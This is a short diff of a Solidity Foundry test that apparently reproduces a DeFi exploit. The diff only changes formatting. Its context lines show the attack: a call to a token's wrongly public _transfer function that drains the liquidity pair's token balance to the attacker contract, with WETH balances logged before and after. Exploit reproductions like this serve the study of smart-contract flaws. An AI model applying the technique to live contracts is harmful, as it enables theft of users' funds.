@@ -43,7 +43,7 @@ contract ContractTest is Test {
             "Attacker amount of WETH before exploitation of vulnerability",
             WETH.balanceOf(address(this)),
             WETH.decimals()
-            );
+        );
         // Vulnerable point. Looks like this function has wrong visibility. This shouldn't be public
         NO._transfer(address(Pair), address(this), NO.balanceOf(address(Pair)) - 1);
 
@@ -63,6 +63,6 @@ contract ContractTest is Test {
             "Attacker amount of WETH after exploitation of vulnerability",
             WETH.balanceOf(address(this)),
             WETH.decimals()
-            );
+        );
     }
 }
